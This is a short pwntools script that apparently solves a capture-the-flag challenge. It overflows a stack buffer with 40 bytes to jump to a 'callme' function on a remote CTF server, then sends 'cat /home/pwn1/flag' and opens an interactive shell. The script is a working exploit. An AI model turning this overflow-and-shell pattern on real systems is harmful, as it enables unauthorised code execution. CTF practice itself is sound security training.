import time
from pwn import *

elf = ELF('pwn1', checksec=False)

payload = 'A' * 40 + p64(elf.symbols['callme'])
r = remote('csie.ctf.tw', 10120)

r.sendline(payload)
time.sleep(1) # delay
r.sendline('cat /home/pwn1/flag')

r.interactive()
